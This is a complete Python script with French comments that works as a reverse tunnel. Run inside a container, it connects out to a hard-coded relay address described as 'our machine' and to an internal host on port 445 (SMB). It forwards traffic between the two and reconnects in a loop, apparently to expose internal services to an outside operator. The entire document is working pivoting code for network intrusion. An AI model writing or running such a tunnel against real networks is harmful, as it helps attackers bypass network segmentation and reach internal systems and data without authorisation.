#!/usr/bin/env python3
# Reverse bridge : connecte une cible interne vers un port de relay sur notre machine.
# Usage (dans le conteneur) : python3 bridge.py <RELAY_PORT> <TARGET_HOST> <TARGET_PORT>
import socket, select, time, sys

MY_IP = "10.138.11.148"
RELAY_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9002
TARGET_HOST = sys.argv[2] if len(sys.argv) > 2 else "10.96.6.4"
TARGET_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 445

def bridge(a, b):
    socks = [a, b]
    try:
        while True:
            r, _, _ = select.select(socks, [], [], 300)
            if not r:
                break
            for s in r:
                try:
                    d = s.recv(65536)
                except OSError:
                    return
                if not d:
                    return
                try:
                    (b if s is a else a).sendall(d)
                except OSError:
                    return
    finally:
        for s in socks:
            try: s.close()
            except: pass

while True:
    try:
        down = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10)
        up = socket.create_connection((MY_IP, RELAY_PORT), timeout=10)
        bridge(up, down)
    except Exception:
        time.sleep(1)
